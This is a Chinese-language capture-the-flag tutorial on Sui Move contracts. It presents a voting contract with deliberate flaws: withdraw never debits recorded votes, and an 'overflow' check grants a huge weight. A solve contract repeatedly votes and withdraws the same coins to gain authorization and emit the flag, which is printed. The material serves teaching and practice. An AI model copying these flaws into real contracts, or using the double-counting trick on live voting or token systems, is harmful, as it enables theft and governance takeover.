# 实践：利用漏洞造成溢出实现攻击


## 示例合约部分
`math::math_utils` 合约
```
module math::math_utils {

    public fun calculate_weight( amount: u256): u256 {
        let (weight, overflow) = check(amount);
        if (overflow) {
            999999999
        } else {
            weight
        }
    }


    fun check(n: u256): (u256, bool) {
        let num = 0xff << 1;
        if (n > num) {
            (0, true)
        } else {
            (n, false)
        }
    }
}
```

`vote::vote` 合约
```
module vote::vote {
    use sui::coin::{Self, Coin};
    use sui::transfer::share_object;
    use sui::balance::{Balance};
    use math::math_utils;
    use sui::table;
    use sui::table::Table;
    use sui::transfer::public_freeze_object;
    use sui::coin::TreasuryCap;
    use sui::vec_map::{Self, VecMap};

    public struct VOTE has drop {}

    public struct Votecap has key {
        id: UID,
        cap: TreasuryCap<VOTE>,
    }

    public struct Mintlist has key {
        id: UID,
        mintlist: VecMap<address, u64>,
    }

    public struct VotingSystem has key {
        id: UID,
        balance: Balance<VOTE>,
        vote_list: Table<address,u64>,
        is_authorized: bool,
    }

    fun init(witness: VOTE, ctx: &mut TxContext) {
        let (treasury_cap, meta) = coin::create_currency(
            witness, 6, b"VOTE", b"VOTE", b"", option::none(), ctx
        );

        let mut vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
        let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty() };
        let coin = coin::mint(&mut vote_cap.cap, 10000, ctx);
        let balance = coin::into_balance(coin);

        let system = VotingSystem {
            id: object::new(ctx),
            balance: balance,
            vote_list: table::new<address,u64>(ctx),
            is_authorized: false,
        };
        public_freeze_object(meta);
        share_object(system);
        share_object(vote_cap);
        share_object(mintlist);
    }

    public fun mint(
        vote_cap: &mut Votecap,
        mint_list: &mut Mintlist,
        ctx: &mut TxContext
    ): Coin<VOTE> {
        let addr = tx_context::sender(ctx);
        assert!(!vec_map::contains(&mint_list.mintlist, &addr), 1);
        let coin = coin::mint(&mut vote_cap.cap, 100, ctx);
        vec_map::insert(&mut mint_list.mintlist, addr, 100);
        coin
    }

    public entry fun vote(
        system: &mut VotingSystem,
        vote_coin: Coin<VOTE>,
        ctx: &mut TxContext
    ) {
        let sender = tx_context::sender(ctx);
        let amount = coin::value(&vote_coin);

        system.balance.join(coin::into_balance(vote_coin));

        if (table::contains(&system.vote_list, sender)) {
            let current_amount = table::borrow_mut(&mut system.vote_list, sender);
            *current_amount = *current_amount + amount;
        } else {
            table::add(&mut system.vote_list, sender, amount);
        };

        let total_amount = *table::borrow(&system.vote_list, sender);
        let weight = math_utils::calculate_weight(total_amount as u256);
        if (weight > 1000000) {
            system.is_authorized = true;
        }
    }

    public fun withdraw(
        system: &mut VotingSystem,
        ctx: &mut TxContext
    ) : Coin<VOTE> {
        let amount = table::borrow(& system.vote_list, ctx.sender());
        let coin = coin::from_balance(system.balance.split(*amount), ctx);
        coin
    }

    public fun is_authorized(system: &VotingSystem): bool {
        system.is_authorized
    }
}
```

`vote::flag_vault` 合约
```
module vote::flag_vault {
    use sui::event::emit;
    use vote::vote::{Self, VotingSystem};
    use std::string::{Self, String};

    public struct FlagEvent has copy, drop {
        flag: String,
        sender: address
    }

    public entry fun get_flag(
        system: &VotingSystem,
        ctx: &mut TxContext
    ) {
        assert!(vote::is_authorized(system), 1);
        let sender = tx_context::sender(ctx);
        emit(FlagEvent{flag: string::utf8(b"CTF{Letsctf_chapter_7}"),sender: sender});
    }
}
```

## 解题合约部分

```
module solve_chapter_7::solve_chapter_7{

    use vote::vote::{mint, vote, withdraw, Votecap, Mintlist, VotingSystem};
    use vote::flag_vault::get_flag;

    public fun solve(
        vote_cap: &mut Votecap,
        mint_list: &mut Mintlist,
        system: &mut VotingSystem,
        ctx: &mut TxContext
    ){
        let coin = mint(vote_cap, mint_list, ctx);
        //100
        vote(system,coin,ctx);
        let coin1 = withdraw(system, ctx);
        //200
        vote(system,coin1,ctx);
        let coin2 = withdraw(system, ctx);
        //400
        vote(system,coin2,ctx);
        let coin3 = withdraw(system, ctx);
        //800
        vote(system,coin3,ctx);
        get_flag(system,ctx);
    }
}
```